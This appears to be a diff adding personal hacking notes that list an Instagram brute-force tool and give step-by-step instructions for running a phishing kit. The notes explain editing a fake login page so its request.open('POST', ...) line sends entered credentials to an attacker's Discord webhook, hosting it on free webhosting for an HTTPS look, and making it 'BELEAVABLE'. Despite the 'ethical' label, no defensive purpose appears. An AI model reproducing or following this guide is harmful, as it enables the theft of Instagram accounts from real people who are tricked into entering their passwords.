@@ -1,0 +1,25 @@
+SOCIAL MEDIA
+INSTAGRAM
+
+Tools:
+	Instagram bruter (not very sucsefull)
+	Insta-Ethical-Hacking
+	
+EXAMPLE: 
+Insta-Ethical-Hacking
+
+1.) Downlaod the tool
+2.) Go into file system and the downloaded files (graphical) and open index.html or 	use "nano index.html" to see code and understand what is happening! 	(OPTIONAL)
+3.) Create server in DISCORD (Used to retrieve data)
+4.) Creat Webhook in the server
+5.) Coppy the URL of Webhook
+6.) in "nano index.html" find the line "request.open("POST","WEBHOOK");" and place 	the url in "WEBHOOK" instead of WEBHOOK there shoud be the link inside 
+	example request.open("POST","URL");
+7.) Then go back to index.html and try to login (the result comes to the discord 	server we created)
+8.) Find a way to host it: example (000webhost.com) then use the domain
+	example domain: hhtps://"name".000webhostapp.com/index.html
+	--- IT CAN BE HOSTED ON OUR OWN APACHE SERVER :)
+TIP: By using some online webhosting the website protocol gets "HTTPS" and it is 	TRUSTWORTHY XD
+TIP: MAKE IT BELEAVABLE
+
+
